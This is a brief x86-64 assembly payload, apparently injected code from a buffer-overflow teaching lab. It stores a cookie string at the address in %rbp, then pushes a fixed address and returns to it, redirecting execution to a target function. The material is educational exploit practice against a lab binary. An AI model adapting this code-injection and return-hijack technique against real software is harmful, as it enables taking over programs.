movq %rbp, %rdi
movq $0x65383436, (%rdi) # $0x36343865, (%rdi)
movq $0x30646338, 4(%rdi) # $0x38636430, 4(%rdi)
movq $0x00, 8(%rdi)
pushq $0x4018e1
ret
